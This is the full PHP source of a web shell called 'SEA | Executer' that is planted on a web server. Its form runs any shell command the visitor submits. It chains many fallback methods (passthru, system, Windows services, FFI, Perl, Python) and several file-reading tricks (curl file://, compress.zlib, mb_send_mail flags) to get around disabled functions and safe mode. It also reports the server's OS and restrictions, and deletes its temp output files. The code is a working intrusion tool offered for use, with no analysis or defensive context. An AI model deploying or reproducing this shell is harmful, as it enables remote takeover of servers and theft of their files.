<?php
if($_POST){$_SESSION['curDir'] = $_POST['curDir'];	}
else{$_SESSION['curDir'] = getcwd();	}

$dir = getcwd();
if(strlen($dir)>1 && $dir[1]==":")
{$os = "Windows";}
else {$os = "Linux";}

error_reporting(0);

?>

<html>
<head>
<title>SEA | Executer .</title>
<link rel="shortcut icon" href='http://sea.sy/style/css/images/sea_en.png' />
<meta http-equiv=Content-Type content=text/html; charset=UTF-8>

<style type="text/css">

.neon{
	color:blue;
	text-shadow: 0 0 5px red,0 0 10px red, 0 0 30px orange, 0 0 45px yellow, 0 0 60px red;
	}
.neon2{
	font-size:15px;
	color:lime;
	text-shadow: 0 0 5px pink,0 0 10px pink, 0 0 30px #968, 0 0 45px #968, 0 0 60px #968
	}
.neon3{
	color:yellow;
	text-shadow: 0 0 5px pink,0 0 10px pink, 0 0 30px #968, 0 0 45px #968, 0 0 60px #968
	}
.hacking{
	position:absolute;
	left:50px; font-size:35px;
	}
.like{
	border:4px double yellow;
	box-shadow:0px 2px 20px white;
	border-radius:10px;
	padding:9px;
	height:310px;}
	img{border:4px double yellow;
	box-shadow:0px 9px 15px white;
	border-radius:10px;
	opacity:0.75;
	-moz-opacity: 0.75;
	filter: alpha(opacity=75);
	}
a {
	text-decoration:none;}

</style>
<style>

@-webkit-keyframes tremer {
	0% {-webkit-transform: rotate(3deg);}
	50% {-webkit-transform: rotate(-3deg);}
	100% {-webkit-transform: rotate(3deg);}
	}
img:hover {
	-webkit-animation:tremer 0.2s linear infinite;
	-moz-animation:tremer 0.2s linear infinite;
	-o-animation:tremer 0.2s linear infinite;
	animation:tremer 0.2s linear infinite;
	}
</style>
<?php
$sh3llColor = "#0040FF";
echo CSS($sh3llColor);
?>
</head>
<!-- Executer -->
<center>
<p><img src="http://sea.sy/style/css/images/sea_en.png" height="200" width="400" style="height:200px;">	
<form enctype="multipart/form-data" method="POST">
  <table width='576' height='72' border='0' id='Box'>
    <tr><td>OS </td><td width="79%"><?php echo $os; ?></td></tr>
  <tr><td>Safe Mode </td><td width="79%"><?php echo SafeMode(); ?></td></tr>
  <tr><td>Disable Functions </td><td width="79%"><?php echo DisableFunctions(); ?></td></tr>
    <tr><td>PHP Version </td><td width="79%"><?php echo phpversion(); ?></td></tr>
  <tr>
<td width='21%' height='21' style="background:<?php echo $sh3llColor; ?>">Executer </td>
<td style='padding-left:10px;' ><input name="curDir" type="text" value="<?php echo filter($_SESSION["curDir"]); ?>" size="50" /></td></tr><tr><td height='45' colspan='2'>
<input name="cmd" type="text" value="<?php  if ($os == 'Linux'){echo "ls -lia";} else {echo "dir";} ?>" size="50" />
<input type='submit' value='Execute' name='execute'>

<?php
if($_POST)
{
	chdir(filter($_POST['curDir']));
	echo '<textarea name="result" cols="80" rows="20" >';
	echo Exe($_POST['cmd']);
	echo '</textarea>';
}
?>

</td></tr></table></form>
<!-- End Of Executer -->
</center>
<?php
# --------------------------
#   Executer PHP
#---------------------------
function Exe($command)
{
	$command = filter($command);
	if(function_exists('passthru')){$exec = passthru($command);}
	elseif(function_exists('system') && !$exec){$exec= system($command); }
	elseif(function_exists('exec') && !$exec){exec($command,$output);$exec=join("\n",$output);}
	elseif(function_exists('shell_exec') && !$exec){$exec=shell_exec($command);}
	elseif(function_exists('proc_open') && !$exec){echo proc_exec($command,filter($_POST['curDir']));}
	elseif(function_exists('popen') && !$exec){$fp = popen($command,"r");
	{while(!feof($fp)){$result.=fread($fp,1024);}pclose($fp);}$exec = convert_cyr_string($result,"d","w");}
	elseif(function_exists('win_shell_execute') && !$exec){$exec = winshell($command);}
	elseif(function_exists('win32_create_service') && !$exec){$exec=srvshell($command);}
	elseif(extension_loaded('ffi') && !$exec){$exec=ffishell($command);}
	elseif(extension_loaded('perl') && !$exec){$exec=perlshell($command);}
	elseif(!$exec) {$exec = slashBypass($command);}
	elseif(!$exec && extension_loaded('python'))
	{$exec = python_eval("import os\nos.system('".$command."')");}
	elseif($exec){return $exec;}
}
function proc_exec($com , $dir)
{
    $start_pipe=array(0=>array("pipe","w"),1=>array("pipe","w"));
    $process=proc_open($com,$start_pipe,$pipes,$dir,NULL);
    return stream_get_contents($pipes[1]);
}
function footer()
{
	echo '<table bgcolor="#cccccc" width="100%"><tr>
	<td width="100%">
	<center><font color="gray" size="-2"><b>
	<font color="gray"></font><sy>   [
	</sy><font color="gray"></div><a href="http://www.sea.sy" target="_blank">www.sea.sy</a></font><sy> ]
	</sy></b>
	</td>
	</tr></table>
	</tbody>
	</body></html>
	';
}
function SafeMode()
{
	$safe_mode = ini_get("safe_mode");
	if (!$safe_mode){$safe_mode = '<font color="green">OFF</font>';}
    else {$safe_mode = '<font color="red">ON</font>';}
	return $safe_mode;
}
function DisableFunctions()
{
	$disfun = ini_get('disable_functions');
	if (empty($disfun)){$disfun = '<font color="green">NONE</font>';}return $disfun;
}
function filter($string)
{
	$string = str_replace("//","/",$string);	
	$string = str_replace("\\\\","\\",$string);
	return $string;	
}
function winshell($command)
{
	$name=whereistmP()."\\".uniqid('NJ');
	win_shell_execute('cmd.exe','',"/C $command >\"$name\"");
	sleep(1);
	$exec=file_get_contents($name);
	DeleteFile($name);
	return $exec;
}
function whereistmP()
{
	$uploadtmp=ini_get('upload_tmp_dir');
	$uf=getenv('USERPROFILE');
	$af=getenv('ALLUSERSPROFILE');
	$se=ini_get('session.save_path');
	$envtmp=(getenv('TMP'))?getenv('TMP'):getenv('TEMP');
	if(is_dir('/tmp') && is_writable('/tmp'))return '/tmp';
	if(is_dir('/usr/tmp') && is_writable('/usr/tmp'))return '/usr/tmp';
	if(is_dir('/var/tmp') && is_writable('/var/tmp'))return '/var/tmp';
	if(is_dir($uf) && is_writable($uf))return $uf;
	if(is_dir($af) && is_writable($af))return $af;
	if(is_dir($se) && is_writable($se))return $se;
	if(is_dir($uploadtmp) && is_writable($uploadtmp))return $uploadtmp;
	if(is_dir($envtmp) && is_writable($envtmp))return $envtmp;
	return '.';
}
function DeleteFile($fileName)
{
	global $os;
	if(function_exists('unlink'))
	{$delete = unlink($fileName);}
	if((!$delete) && ($os == 'Windows'))
	{$delete = Exe("del $fileName"); }
	else if((!$delete) && ($os == 'Linux'))
	{$delete = Exe("rm -f $fileName");}
	if($delete){return true;}else{return false;}
}
function srvshell($command)
{
	$name=whereistmP()."\\".uniqid('NJ');
	$n=uniqid('NJ');
	$cmd=(empty($_SERVER['ComSpec']))?'d:\\windows\\system32\\cmd.exe':$_SERVER['ComSpec'];
	win32_create_service(array('service'=>$n,'display'=>$n,'path'=>$cmd,'params'=>"/c $command >\"$name\""));
	win32_start_service($n);
	win32_stop_service($n);
	win32_delete_service($n);
	while(!file_exists($name))sleep(1);
	$exec=file_get_contents($name);
	DeleteFile($name);
	return $exec;
}
function ffishell($command)
{
	$name=whereistmP()."\\".uniqid('NJ');
	$api=new ffi("[lib='kernel32.dll'] int WinExec(char *APP,int SW);");
	$res=$api->WinExec("cmd.exe /c $command >\"$name\"",0);
	while(!file_exists($name))sleep(1);
	$exec=file_get_contents($name);
	DeleteFile($name);
	return $exec;
}
function perlshell($command)
{
	$perl=new perl();
	ob_start();
	$perl->eval("system('".$command."')");
	$exec=ob_get_contents();
	ob_end_clean();
	return $exec;
}
function slashBypass($cmd)
{
	GenerateFile("cmd.bat","$cmd>sy3.txt"."\r\n exit");
	exec("\start cmd.bat");
	ReadingFiles('sy3.txt');
}
function GenerateFile($name,$content)
{
	if(function_exists('fopen') && function_exists('fclose'))
	{
		$file = fopen($name,"w+");
		if($file)
		{
			if(function_exists('fwrite')){$writeFile = fwrite($file,$content); }	
			else if (function_exists('fputs')){$writeFile = fputs($file,$content); }
			else if (function_exists('file_put_contents')){$writeFile = file_put_contents($file,$content);}
			if(!$writeFile){return false;}
		}
		else{return false;}fclose($file);return true;
	}
}
function ReadingFiles($file)
{
	$openMyFile = fopen($file,'r'); //Open The File
	if(function_exists('fread')){echo fread($openMyFile,100000);	} // Fread()
	elseif(function_exists('fgets')){echo fgets($openMyFile);} // fgets()
	elseif(function_exists('readfile')){echo readfile($openMyFile);} // readfile()
	elseif(function_exists('file_get_contents'))
	{$readMyFile = file_get_contents($file, NULL, NULL, 0, 1000000);var_dump($readMyFile);} // file_get_contents()
	else if(!is_dir(dirname(__FILE__)."/http:")) // curl Using file:HTTP
	{
		if(!is_writable(dirname(__FILE__))) echo "I can't create http:directory";
		else
		{
			mkdir("http:");
			if(get_magic_quotes_gpc() == 1){$file = stripslashes($_POST['file']);}
			else{$file=$_POST['file'];}
			if((curl_exec(curl_init("file:http://../".htmlspecialchars_decode($file))))  and !empty($file))  die();
			elseif(!empty($file)) die("Sorry... File ".htmlspecialchars($file)." doesn't exists or you don't have permissions.");	
		}
	}
	elseif(function_exists('file')) // file
	{
		$readMyFile = file($file); 
		foreach ($readMyFile as $line_num => $readMyFileLine) 
		{ echo $readMyFileLine . "
"; 
}
	}
	elseif(function_exists('copy')) // copy
	{
		$tmp=tempnam('','cx');
		copy('compress.zlib://'.$file,$tmp);
		$fh=fopen($tmp,'r');
		$data=fread($fh,filesize($tmp));
		fclose($fh);
		echo $data;
	}
	elseif(function_exists('mb_send_mail')) // mb_send_mail
	{
		if(file_exists('/tmp/mb_send_mail')){DeleteFile('/tmp/mb_send_mail');}
		mb_send_mail(NULL, NULL, NULL, NULL,'-C $file -X /tmp/mb_send_mail');
		readfile('/tmp/mb_send_mail');
	}
	else if(function_exists('curl_init')) // curl_init
	{
		$ch = curl_init("file://".$file."\x00".__FILE__);
		var_dump(curl_exec($ch));
	} 
	else if(is_object($ws=new COM('WScript.shell'))){echo $exec=comshell("type '$file'",$ws);} // WScript.shell
	else if(function_exists('win_shell_execute')){echo winshell("type '$file'");} // win_shell_execute
	else if(function_exists('win32_create_service')){echo srvshell("type '$file'");} // win32_create_service
	elseif(function_exists('tempnam')) // tempnam
	{
		$tymczas="./";
		$temp=tempnam($tymczas, "cx");
		if(copy("compress.zlib://".$file, $temp))
		{
			$zrodlo = fopen($temp, "r");
			$tekst = fread($zrodlo, filesize($temp));
			fclose($zrodlo);
			echo htmlspecialchars($tekst);
			DeleteFile($temp);
		} 
		else {echo htmlspecialchars($file)."dosen't exists or you don't have access.";}
	}
	elseif(Exe('cat '.$file.'')){echo Exe('cat '.$file.'');	}
	elseif(function_exists('include')){include($file);	}
	fclose($openMyFile);	
}
function CSS($sh3llColor)
{
	$css =  "
	<style>
	BODY
	{
		FONT-FAMILY: Verdana; 
		margin: 2;
		color: #cccccc;
		background-color: #33363b;
	}
	sy  
	{
		color:".$sh3llColor.";
		font-size:7pt;
		font-weight: bold;
	}
	#Box
	{
	color:".$sh3llColor.";
	font-size:14px;
	background-color:#1C1C1C;
	font-weight:bold;
	width:500px;
	}
	tr 
	{
	BORDER-RIGHT:  #cccccc 1px solid;
	BORDER-TOP:    #cccccc 1px solid;
	BORDER-LEFT:   #cccccc 1px solid;
	BORDER-BOTTOM: #cccccc 1px solid;
	color: #ffffff;
	}
	td 
	{
	BORDER-RIGHT:  #cccccc 1px solid;
	BORDER-TOP:    #cccccc 1px solid;
	BORDER-LEFT:   #cccccc 1px solid;
	BORDER-BOTTOM: #cccccc 1px solid;
	color: #cccccc;
	}
	table 
	{
	BORDER:  #eeeeee  outset;
	BACKGROUND-COLOR: #1C1C1C;
	color: #cccccc;
	}
	input 
	{
	BORDER-RIGHT:  ".$sh3llColor." 1px solid;
	BORDER-TOP:    ".$sh3llColor." 1px solid;
	BORDER-LEFT:   ".$sh3llColor." 1px solid;
	BORDER-BOTTOM: ".$sh3llColor." 1px solid;
	BACKGROUND-COLOR: #333333;
	font: 9pt tahoma;
	color: #ffffff;
	}
	select 
	{
	BORDER-RIGHT:  #ffffff 1px solid;
	BORDER-TOP:    #999999 1px solid;
	BORDER-LEFT:   #999999 1px solid;
	BORDER-BOTTOM: #ffffff 1px solid;
	BACKGROUND-COLOR: #000000;
	font: 9pt tahoma;
	color: #CCCCCC;;
	}
	submit 
	{
	BORDER:  1px outset buttonhighlight;
	BACKGROUND-COLOR: #272727;
	width: 40%;
	color: #cccccc;
	}
	textarea 
	{
	BORDER-RIGHT:  #ffffff 1px solid;
	BORDER-TOP:    #999999 1px solid;
	BORDER-LEFT:   #999999 1px solid;
	BORDER-BOTTOM: #ffffff 1px solid;
	BACKGROUND-COLOR: #333333;
	color: #ffffff;
	}
	A:link {COLOR:".$sh3llColor."; TEXT-DECORATION: none}
	A:visited { COLOR:".$sh3llColor."; TEXT-DECORATION: none}
	A:active {COLOR:".$sh3llColor."; TEXT-DECORATION: none}
	A:hover {color:blue;TEXT-DECORATION: none}
	</style>";
	return $css;
}
footer();
?>
